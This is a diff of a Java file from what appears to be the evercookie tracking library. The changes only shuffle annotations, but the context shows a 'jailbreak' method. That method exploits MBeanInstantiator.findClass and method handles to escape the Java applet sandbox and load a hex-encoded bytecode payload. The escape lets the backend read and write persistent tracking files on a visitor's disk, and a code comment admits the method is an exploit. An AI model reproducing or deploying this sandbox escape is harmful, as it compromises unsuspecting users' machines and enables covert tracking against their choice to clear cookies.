@@ -19,6 +19,7 @@ import com.sun.jmx.mbeanserver.MBeanInstantiator;
  * @author Gabriel Bauman <gabe@codehaus.org>
  * 
  */
+@SuppressWarnings("restriction")
 public class EvercookieFileBackend implements EvercookieBackend {
 
 	private final boolean JAILBROKEN = jailbreak(); // QUAD DAMAGE
@@ -41,12 +42,10 @@ public class EvercookieFileBackend implements EvercookieBackend {
 		}
 	}
 
-	@Override
 	public boolean isAvailable() {
 		return JAILBROKEN && file.exists() && file.canRead() && file.canWrite();
 	}
 
-	@Override
 	public void save(final Properties values) {
 
 		if (!isAvailable()) {
@@ -66,7 +65,6 @@ public class EvercookieFileBackend implements EvercookieBackend {
 
 	}
 
-	@Override
 	public void load(final Properties data) {
 
 		if (!isAvailable()) {
@@ -86,7 +84,6 @@ public class EvercookieFileBackend implements EvercookieBackend {
 		}
 	}
 
-	@Override
 	public void cleanup() {
 
 		if (!isAvailable()) {
@@ -113,6 +110,7 @@ public class EvercookieFileBackend implements EvercookieBackend {
 	 * Because the code for this exploit is publicly available, and because
 	 * there is a patch already, it seems like.
 	 */
+	@SuppressWarnings("rawtypes")
 	private static boolean jailbreak() {
 		try {
 
@@ -123,10 +121,8 @@ public class EvercookieFileBackend implements EvercookieBackend {
 
 			ClassLoader a = null;
 
-			@SuppressWarnings("rawtypes")
 			Class localClass1 = localMBeanInstantiator.findClass("sun.org.mozilla.javascript.internal.Context", a);
 
-			@SuppressWarnings("rawtypes")
 			Class localClass2 = localMBeanInstantiator.findClass(
 					"sun.org.mozilla.javascript.internal.GeneratedClassLoader", a);
 
@@ -165,7 +161,6 @@ public class EvercookieFileBackend implements EvercookieBackend {
 
 			byte[] bytecode = hex2Byte(payload);
 
-			@SuppressWarnings("rawtypes")
 			Class localClass3 = (Class) localMethodHandle5.invokeWithArguments(new Object[] { localObject2, null,
 					bytecode });
 
